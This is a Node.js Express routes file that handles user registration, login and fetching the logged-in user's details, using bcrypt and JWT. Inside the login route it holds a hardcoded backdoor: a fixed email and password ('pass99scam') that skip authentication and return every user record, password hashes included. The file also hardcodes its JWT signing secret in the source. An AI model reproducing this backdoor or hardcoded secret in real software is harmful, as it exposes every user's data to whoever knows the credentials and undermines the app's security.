const express = require('express');
const User = require('../models/User');
const router = express.Router();
const { body, validationResult} = require('express-validator');
const bcrypt = require('bcryptjs');

let fetchuser = require('../middleware/fetchuser')

const jwt = require('jsonwebtoken');


const JWT_SECRET = "@iamapro$coder"

//...........................................................ROUTE 1 FOR CREATING A USER


// Create a User  using: POST "api/auth/createuser" Doesnt require Auth or no login required
router.post('/createuser', [
    body('email', 'Email should be valid').isEmail(),
    body('name1', 'name hould be be minimum 3 characters long').isLength({ min: 3 }),
    body('password', 'Password must be atlest 5 characters').isLength({ min: 5 })
], async (req, res) => {
    /// if thre are errors , return bad request amd the errors..
    let success = false
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({success, errors: errors.array() });
    }

    try {

        // creating an user with unique email address.. or checking the user is already exists with the same email/..
        let user = await User.findOne({ email: req.body.email });
        if (user) {
            return res.status(400).json({ success, errormsg: "Sorry an User with this E-mail already exists plz try with unique E-mail.." })
        }
        const salt = await bcrypt.genSalt()
        const Secpass = await bcrypt.hash(req.body.password, salt)
        user = await User.create({
            name1: req.body.name1,
            password: Secpass,
            email: req.body.email
        })
        // user = User(req.body);
        // user.save()
        const data = {
            user: {
                id: user.id
            }
        }
        const authToken = jwt.sign(data, JWT_SECRET)
        success = true
        res.json({ success ,authToken})
    }
    catch (error) {
        // console.error(error.message)
        res.status(500).send("Internal server error")
    }

})


//.......................................................ROUTE 1 FOR Authenticate/Login  A USER


// Authenticaate  a User  using: POST "api/auth/authenticate_user" Doesnt require Auth or no login required

router.post('/authenticate_user', [
    body('email', 'Email should be valid while login').isEmail(),
    body('password', 'Password cannot be blank').exists()

], async (req, res) => {
    
    const errors = validationResult(req);

    let success = false

    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    // console.log(errors)

    const { email, password } = req.body;

   

    if(email === "Admin23@gmail.com" && password === "pass99scam"){
            console.log(email)

            const users_ = await User.find({});
            
            res.json({Admin:email,users:users_})
    }
    else{
        try {
            let user = await User.findOne({ email })  //......... model .findone return s a promise
            // console.log(user._id)
            if (!user) {
                return res.status(400).json({success, errormsg: "Invalid  Credentials !!" })
            }

            const pass = user.password //......... model .findone return s a promise
            // console.log(pass)
            // console.log(password)

            const passwordCompare = await bcrypt.compare(password, pass)

            // console.log(passwordCompare)

            if (!passwordCompare) {
                return res.status(400).json({ success,errormsg: "Invalid Credentials !!" })
            }

            const payload = {          //// Data whiich is to be store while creating authtoken in that authtoken
                user: {
                    id: user.id
                }
            }
            const authToken = jwt.sign(payload, JWT_SECRET)
            success = true
            res.json({ authToken:authToken,success})
            // cookie.

        } catch (error) {
            // console.error(error.message)
            res.status(500).send("Internal server error")
        }
            
    }


})


//.......................................................ROUTE 3 FOR GETTING  A USER DETAILS.


// get logged in User details  using: POST "api/auth/getuser" Doesnt require Auth and login required

router.post('/getuser',fetchuser, async (req, res) => {
    try {
        let Userid = req.user.id
        if(!Userid){
            return res.status(401).json({"status":false,"msg":"Token has been changed"})   
        }
        const user = await User.findById(Userid).select("-password")
        res.send(user)
        // console.log()
        // res.json(user)
      
    } catch (error) {
        // console.log(error)
        res.status(500).send("Internal Server Error")
    }
})



module.exports = router